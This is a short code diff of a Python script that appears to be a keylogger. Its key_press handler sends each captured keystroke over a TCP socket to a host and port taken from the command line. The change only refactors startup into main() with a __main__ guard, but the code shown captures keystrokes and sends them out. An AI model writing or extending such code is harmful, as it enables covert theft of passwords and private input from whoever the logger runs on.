@@ -14,7 +14,10 @@ def key_press(key):
         k = k.replace("'", "")
         s.sendall(bytes(k, "ascii"))
 def main():
-    global s
+    HOST = sys.argv[1]
+    PORT = int(sys.argv[2])
+    global closed, s
+    closed = True
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((HOST, PORT))
     global closed
@@ -30,8 +33,5 @@ def main():
         except Exception as e:
             print(e)
 
-HOST = sys.argv[1]
-PORT = int(sys.argv[2])
-global s
-closed = True
-main()
+if __name__ == "__main__":
+    main()
